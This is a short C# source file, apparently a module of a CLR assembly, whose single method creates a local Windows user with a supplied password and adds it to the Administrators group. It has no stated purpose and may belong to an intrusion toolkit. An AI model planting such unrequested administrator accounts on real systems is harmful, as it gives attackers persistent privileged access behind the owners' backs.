namespace CLR_module;

internal class adduser
{
	public static void add(string userName, string password)
	{
		LocalGroupUserHelper localGroupUserHelper = new LocalGroupUserHelper();
		string groupName = "Administrators";
		localGroupUserHelper.AddUser(null, userName, password, null);
		localGroupUserHelper.GroupAddMembers(null, groupName, userName);
	}
}
